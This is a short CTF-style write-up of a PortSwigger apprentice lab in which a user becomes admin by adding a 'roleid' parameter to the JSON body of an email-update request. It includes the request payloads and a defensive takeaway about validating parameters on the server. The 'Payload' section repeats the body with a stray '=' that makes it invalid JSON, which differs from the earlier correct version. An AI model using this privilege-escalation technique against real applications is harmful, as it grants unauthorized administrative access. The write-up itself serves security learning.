# Challenge Name: User role can be modified in user profile
# Platform: PortSwigger
# Difficulty: Apprentice

## 1. Vulnerability Type
Broken Access Control - unauthorized privilege escalation
## 2. Root Cause
`Update email` function does not check the updated parameters. Logged in user can intercept the request and change his `roleid` to `2` and become admin.

## 3. Attack Surface
`/my-account?id=` => to exploit `Update email` function
`/admin` => unauthorized admin access after privilege escalation

## 4. Exploit Method
`Update email` function contains the following request:
```bash
{
    "email":"wiener@gmail.com"
}
```
If we change it to:
```bash
{
    "email":"wiener@gmail.com",
    "roleid":2
}
```
We update our account to admin level and have access to admin panel.
## 5. Payload / Technique
```bash
{
    "email":"wiener@gmail.com",
    "roleid":=2
}
```
## 6. Impact
Unauthorized access to admin panel. Potential data loss, fully administrative access.

## 7. Reusable Pattern
If parameter is known, it is possible to test other functions that use POST, PUT requests. This will change the user privelege and user can gain unauthorized access to the system.

## 8. Key Takeaway
Always validate the parameters that function accepts. Do not blindly trust client requests because client can easily modify them using proxy tools. Validate server-side only.


